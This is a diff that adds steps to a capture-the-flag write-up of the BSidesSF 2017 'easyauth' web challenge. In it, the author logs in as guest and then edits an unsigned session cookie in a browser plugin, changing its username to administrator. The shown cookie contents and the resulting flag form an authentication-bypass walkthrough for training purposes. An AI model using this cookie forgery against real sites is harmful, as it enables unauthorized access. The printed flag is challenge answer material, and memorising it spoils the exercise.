@@ -70,17 +70,53 @@ file: easyauth.php
   print "<p><a href='/index.php?action=logout'>Log out</a></p>\n";
 ?>
 ```
-
+We know now that we need to log in as administrator !!!
 Connect to site.
 
 <img src="./../files/site.png">
 
 ```
 Hint: Try guest/guest
-
 We connect to site with credentials guest:guest
 
 ```
 
 <img src="./../files/guest.png">
+
+We see the cookie appear.
+I modify it with the plugin Cookie+ Manager de Firefox. Knowing that we have to be logged into administrator.
+
+
+```
+Host:                 easyauth-afee0e67.ctf.bsidessf.net
+Name:                 auth
+Path:                 /
+Content:              username%3Dadministrator%26date%3D2017-02-13T08%3A35%3A43%2B0000%26
+Content raw:          username%3Dadministrator%26date%3D2017-02-13T08%3A35%3A43%2B0000%26
+Expires:              À la fin de la session
+Expires raw:          0
+Send for:             Tout type de connexion
+Send for raw:         false
+Created:              Monday, February 13, 2017 9:34:50 AM
+Created raw:          1486974889695000
+Last accessed:        Monday, February 13, 2017 9:35:29 AM
+Last accessed raw:    1486974929269000
+HTTP only:            No
+HTTP only raw:        false
+This domain only:     No
+This domain only raw: false
+Policy:               no information available
+Policy raw:           0
+Status:               no information available
+Status raw:           0
+---
+```
+
+Then reload the page by logging in as administrator.
+
+<img src="./../files/admin.png">
+
+```
+FLAG:0076ecde2daae415d7e5ccc7db909e7e
+```
 
